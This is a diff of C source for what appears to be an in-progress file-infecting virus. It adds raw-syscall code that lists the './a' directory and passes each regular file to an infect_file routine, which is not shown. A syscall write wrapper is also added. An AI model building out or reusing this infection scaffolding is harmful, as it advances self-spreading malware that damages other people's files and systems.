@@ -1,15 +1,18 @@
+#include <dirent.h>
 #include <fcntl.h>
 #include <stddef.h>
 
 // Syscall wrapper
+#include <stdint.h>
 #include <sys/syscall.h>
 __attribute__((always_inline)) inline long sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
 __attribute__((always_inline)) inline void ft_exit(int exit_code);
 __attribute__((always_inline)) inline int ft_open(volatile char *path, volatile int flags, volatile mode_t mode);
 __attribute__((always_inline)) inline int ft_getdents64(int fd, char dirp[], size_t count);
+__attribute__((always_inline)) inline int ft_write(int fd, volatile void *ptr, size_t size);
 
 // Functions
-__attribute__((always_inline)) inline int infect_dir(char *path);
+__attribute__((always_inline)) inline int infect_dir(volatile char *dir_path);
 
 #ifdef TESTING
 int
@@ -17,36 +20,47 @@ main(void) {
 #else
 void
 _start() {
-#endif /* ifdef TESTING */
-    // char path[2];
-    // path[0] = '.';
-    // path[1] = '\0';
-    //
-    // infect_dir(path);
-    ft_exit(100);
+#endif
+    __attribute__((section(".text"))) volatile static char *dirs[] = {"./a", NULL};
+
+    for (int i = 0; dirs[i] != NULL; i++) {
+        if (infect_dir(dirs[i])) ft_exit(1);
+    }
+
+    ft_exit(0);
 }
 
+typedef struct linux_dirent64 {
+
+    uint64_t d_ino;          /* 64-bit inode number */
+    uint64_t d_off;          /* Not an offset; see getdents() */
+    unsigned short d_reclen; /* Size of this dirent */
+    unsigned char d_type;    /* File type */
+    char d_name[];           /* Filename (null-terminated) */
+} dirent64;
+
 __attribute__((always_inline)) inline int
-infect_dir(char *path) {
-    // int fd = ft_open(path, O_RDONLY, O_DIRECTORY);
-    //
-    // const uint64_t FILE_NAME_MAX = 255;
-    // const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
-    // const uint64_t ALINMENT = 8;
-    // const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;
-    //
-    // char dirp[DIR_P_SIZE];
-    // int bytes_read = 0;
-    // do {
-    //     bytes_read = ft_getdents64(fd, dirp, DIR_P_SIZE);
-    //     if (bytes_read < 0) return (1);
-    //
-    //     dirent64 *dirent_cur = (dirent64 *)dirp;
-    //     while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
-    //         if (dirent_cur->d_type == DT_REG) infect_file(dirent_cur->d_name);
-    //         dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
-    //     }
-    // } while (bytes_read > 0);
+infect_dir(volatile char *dir_path) {
+    int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
+    if (fd_dir < 0) return fd_dir;
+
+    const uint64_t FILE_NAME_MAX = 255;
+    const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
+    const uint64_t ALINMENT = 8;
+    const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;
+
+    char dirp[DIR_P_SIZE];
+    int bytes_read = 0;
+    do {
+        bytes_read = ft_getdents64(fd_dir, dirp, DIR_P_SIZE);
+        if (bytes_read < 0) return (1);
+
+        dirent64 *dirent_cur = (dirent64 *)dirp;
+        while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
+            if (dirent_cur->d_type == DT_REG) infect_file(dirent_cur->d_name);
+            dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
+        }
+    } while (bytes_read > 0);
 
     return (0);
 }
@@ -76,6 +90,10 @@ ft_getdents64(int fd, char dirp[], size_t count) {
     return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
 }
 
+__attribute__((always_inline)) inline int
+ft_write(int fd, volatile void *ptr, size_t size) {
+    return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
+}
 // #include <stdint.h>
 // #include <stdio.h>
 // #include "syscall.h"
@@ -168,10 +186,6 @@ ft_getdents64(int fd, char dirp[], size_t count) {
 //     char d_name[];           /* Filename (null-terminated) */
 // } dirent64;
 //
-// __attribute__((always_inline)) inline int
-// ft_write(int fd, volatile void *ptr, size_t size) {
-//     return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
-// }
 // __attribute__((always_inline)) inline void
 // prints_str_nl(volatile char *str) {
 //     ft_write(1, str, ft_strlen(str));
